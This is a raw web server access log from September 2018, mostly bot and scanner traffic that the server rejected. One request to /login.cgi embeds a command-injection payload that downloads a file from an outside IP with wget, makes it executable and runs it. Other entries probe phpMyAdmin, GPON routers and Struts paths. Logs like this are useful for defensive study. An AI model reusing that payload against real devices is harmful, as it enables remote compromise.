87.99.70.42 - - [14/Sep/2018:07:24:11 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.17.96.2 - - [14/Sep/2018:07:57:50 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
78.165.110.140 - - [14/Sep/2018:08:01:44 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
79.127.9.249 - - [14/Sep/2018:08:54:51 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
203.116.128.65 - - [14/Sep/2018:09:35:38 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
173.235.60.94 - - [14/Sep/2018:09:41:46 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
74.50.191.200 - - [14/Sep/2018:10:05:00 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
190.214.13.98 - - [14/Sep/2018:10:18:04 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
189.78.251.153 - - [14/Sep/2018:10:44:43 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
95.181.179.253 - - [14/Sep/2018:10:54:19 +1000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 403 178 "-" "Mozilla/5.0"
139.162.119.197 - - [14/Sep/2018:11:29:46 +1000] "GET / HTTP/1.1" 403 178 "-" "Go-http-client/1.1"
95.9.192.200 - - [14/Sep/2018:11:39:27 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.35.108.182 - - [14/Sep/2018:11:47:44 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
2.179.210.20 - - [14/Sep/2018:11:59:28 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
101.128.72.153 - - [14/Sep/2018:13:30:56 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
188.168.27.181 - - [14/Sep/2018:14:01:56 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.104.108.109 - - [14/Sep/2018:14:07:12 +1000] "GET / HTTP/1.1" 403 152 "-" "Mozilla/5.0"
58.228.54.90 - - [14/Sep/2018:14:23:53 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
191.255.142.6 - - [14/Sep/2018:15:21:27 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
103.90.204.164 - - [14/Sep/2018:15:25:03 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
84.195.151.92 - - [14/Sep/2018:15:29:23 +1000] "GET / HTTP/1.1" 403 178 "-" "curl/7.43.0"
42.56.92.188 - - [14/Sep/2018:15:47:18 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
201.95.1.252 - - [14/Sep/2018:16:22:59 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
109.94.226.132 - - [14/Sep/2018:17:42:22 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
168.195.255.176 - - [14/Sep/2018:18:21:31 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
114.69.238.76 - - [14/Sep/2018:19:14:39 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
31.134.106.43 - - [14/Sep/2018:19:29:29 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
197.58.253.77 - - [14/Sep/2018:20:36:42 +1000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://80.211.173.159/k%20-O%20/tmp/ks;chmod%20777%20/tmp/ks;sh%20/tmp/ks%27$ HTTP/1.1" 400 182 "-" "LMAO/2.0"
119.47.90.6 - - [14/Sep/2018:21:52:43 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
170.80.219.30 - - [14/Sep/2018:21:58:47 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
110.76.128.130 - - [14/Sep/2018:22:13:08 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.252.252.151 - - [14/Sep/2018:22:15:41 +1000] "HEAD / HTTP/1.1" 403 0 "-" "-"
191.205.55.169 - - [14/Sep/2018:22:27:21 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.73.46.12 - - [14/Sep/2018:22:46:41 +1000] "GET / HTTP/1.1" 403 580 "-" "User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705"
111.73.46.12 - - [14/Sep/2018:22:46:42 +1000] "GET /index.action HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
196.52.43.121 - - [14/Sep/2018:23:57:23 +1000] "GET / HTTP/1.0" 403 178 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0"
183.80.127.150 - - [15/Sep/2018:00:34:10 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
186.79.28.88 - - [15/Sep/2018:02:08:06 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
122.160.233.92 - - [15/Sep/2018:02:23:24 +1000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 182 "-" "Hello, World"
78.160.126.200 - - [15/Sep/2018:02:26:52 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
213.25.134.94 - - [15/Sep/2018:03:09:36 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.138.69.129 - - [15/Sep/2018:06:46:33 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
103.216.186.234 - - [15/Sep/2018:07:04:13 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
110.77.184.116 - - [15/Sep/2018:08:06:10 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
51.38.12.21 - - [15/Sep/2018:08:16:01 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
107.170.200.15 - - [15/Sep/2018:08:27:58 +1000] "GET / HTTP/1.1" 403 152 "-" "Mozilla/5.0 zgrab/0.x"
71.12.84.195 - - [15/Sep/2018:08:38:01 +1000] "GET / HTTP/1.1" 403 178 "-" "curl/7.43.0"
110.172.188.58 - - [15/Sep/2018:10:01:31 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
103.217.154.206 - - [15/Sep/2018:12:18:19 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
200.161.164.208 - - [15/Sep/2018:12:31:07 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.89.252.222 - - [15/Sep/2018:12:38:56 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.115.176.12 - - [15/Sep/2018:12:52:48 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
5.188.210.12 - - [15/Sep/2018:15:55:58 +1000] "\x05\x01\x00" 400 182 "-" "-"
5.188.210.12 - - [15/Sep/2018:15:58:23 +1000] "\x04\x01\x00P\x05\xBC\xD2\x0C\x00" 400 182 "-" "-"
5.188.210.12 - - [15/Sep/2018:15:59:25 +1000] "GET http://5.188.210.12/echo.php HTTP/1.1" 403 152 "https://www.google.com/" "PxBroker/0.3.1/6131"
178.94.19.190 - - [15/Sep/2018:16:33:38 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
179.110.83.52 - - [15/Sep/2018:16:33:53 +1000] "GET / HTTP/1.1" 403 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
164.215.244.182 - - [15/Sep/2018:16:52:29 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
125.161.107.36 - - [15/Sep/2018:17:01:32 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.109.155.242 - - [15/Sep/2018:17:29:39 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
179.97.153.77 - - [15/Sep/2018:18:03:08 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
201.68.166.128 - - [15/Sep/2018:18:19:49 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
168.232.12.90 - - [15/Sep/2018:18:49:44 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
5.11.44.158 - - [15/Sep/2018:19:51:04 +1000] "GET / HTTP/1.1" 403 178 "-" "-"
195.88.209.6 - - [15/Sep/2018:20:21:29 +1000] "GET / HTTP/1.1" 403 208 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
139.162.106.181 - - [15/Sep/2018:21:39:12 +1000] "GET / HTTP/1.1" 403 178 "-" "Go-http-client/1.1"
47.91.87.165 - - [15/Sep/2018:21:42:38 +1000] "HEAD / HTTP/1.0" 403 0 "-" "-"
80.41.147.123 - - [15/Sep/2018:21:43:41 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
47.91.87.165 - - [15/Sep/2018:21:52:59 +1000] "GET / HTTP/1.1" 403 208 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)"
47.91.87.165 - - [15/Sep/2018:21:52:59 +1000] "GET /robots.txt HTTP/1.1" 403 208 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)"
47.91.87.165 - - [15/Sep/2018:21:52:59 +1000] "GET /phpmyadmin HTTP/1.1" 403 208 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)"
47.91.87.165 - - [15/Sep/2018:21:53:00 +1000] "GET /data/admin/ver.txt HTTP/1.1" 403 208 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)"
47.91.87.165 - - [15/Sep/2018:21:53:00 +1000] "GET /data/admin/verifies.txt HTTP/1.1" 403 208 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; Maxthon 2.0)"
185.248.100.159 - - [15/Sep/2018:21:55:00 +1000] "HEAD /v3.0/web/assets/css/site.css HTTP/1.1" 403 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
46.152.123.164 - - [15/Sep/2018:22:08:07 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.152.123.164 - - [15/Sep/2018:22:08:07 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
46.152.123.164 - - [15/Sep/2018:22:08:07 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
183.178.4.39 - - [15/Sep/2018:22:10:15 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
91.214.84.225 - - [15/Sep/2018:22:16:09 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
91.206.149.68 - - [15/Sep/2018:22:23:02 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
217.130.125.194 - - [15/Sep/2018:22:30:34 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
177.95.220.108 - - [15/Sep/2018:23:00:06 +1000] "GET / HTTP/1.1" 403 580 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
180.247.32.42 - - [15/Sep/2018:23:22:15 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
31.40.129.78 - - [16/Sep/2018:01:03:58 +1000] "GET / HTTP/1.0" 403 178 "-" "-"
